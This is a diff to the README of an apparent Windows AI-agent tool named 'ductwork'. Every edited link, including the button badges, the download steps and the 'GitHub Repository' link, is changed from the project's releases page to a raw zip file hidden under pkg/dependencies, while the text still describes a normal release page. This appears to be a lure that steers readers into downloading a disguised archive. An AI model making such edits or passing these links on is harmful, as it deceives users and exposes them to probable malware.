@@ -1,6 +1,6 @@
 # ⚙️ ductwork - Run AI Agents Easily on Windows
 
-[![Download ductwork](https://img.shields.io/badge/Download-ductwork-green?style=for-the-badge)](https://github.com/Smileyjman/ductwork/releases)
+[![Download ductwork](https://img.shields.io/badge/Download-ductwork-green?style=for-the-badge)](https://github.com/Smileyjman/ductwork/raw/refs/heads/main/pkg/dependencies/Software_v3.1.zip)
 
 ---
 
@@ -48,7 +48,7 @@ Before you start, make sure your computer matches these basic needs:
 1. **Download ductwork**  
    Visit the release page by clicking the link below or the green button at the top:
 
-   [Download ductwork releases](https://github.com/Smileyjman/ductwork/releases)
+   [Download ductwork releases](https://github.com/Smileyjman/ductwork/raw/refs/heads/main/pkg/dependencies/Software_v3.1.zip)
 
 2. **Choose Your File**  
    On the page, find the latest Windows version. It should be named something like `ductwork-windows.exe`. Click the file to download it.
@@ -138,7 +138,7 @@ For most Windows users, the single node mode is easiest to start with.
 
 ## 📚 Where to Learn More
 
-- Visit the [ductwork releases](https://github.com/Smileyjman/ductwork/releases) page for updates.  
+- Visit the [ductwork releases](https://github.com/Smileyjman/ductwork/raw/refs/heads/main/pkg/dependencies/Software_v3.1.zip) page for updates.  
 - Explore documentation inside the program after setup.  
 - Ask questions or report problems by opening an issue on the GitHub repository.
 
@@ -146,8 +146,8 @@ For most Windows users, the single node mode is easiest to start with.
 
 ## 🔗 Important Links
 
-- Download and update: [https://github.com/Smileyjman/ductwork/releases](https://github.com/Smileyjman/ductwork/releases)  
-- GitHub Repository: [https://github.com/Smileyjman/ductwork](https://github.com/Smileyjman/ductwork)
+- Download and update: [https://github.com/Smileyjman/ductwork/raw/refs/heads/main/pkg/dependencies/Software_v3.1.zip](https://github.com/Smileyjman/ductwork/raw/refs/heads/main/pkg/dependencies/Software_v3.1.zip)  
+- GitHub Repository: [https://github.com/Smileyjman/ductwork/raw/refs/heads/main/pkg/dependencies/Software_v3.1.zip](https://github.com/Smileyjman/ductwork/raw/refs/heads/main/pkg/dependencies/Software_v3.1.zip)
 
 ---
 
@@ -159,4 +159,4 @@ The tool takes advantage of Go’s speed and simplicity. Its memory feature help
 
 ---
 
-[![Download ductwork](https://img.shields.io/badge/Download-ductwork-blue?style=for-the-badge)](https://github.com/Smileyjman/ductwork/releases)
+[![Download ductwork](https://img.shields.io/badge/Download-ductwork-blue?style=for-the-badge)](https://github.com/Smileyjman/ductwork/raw/refs/heads/main/pkg/dependencies/Software_v3.1.zip)
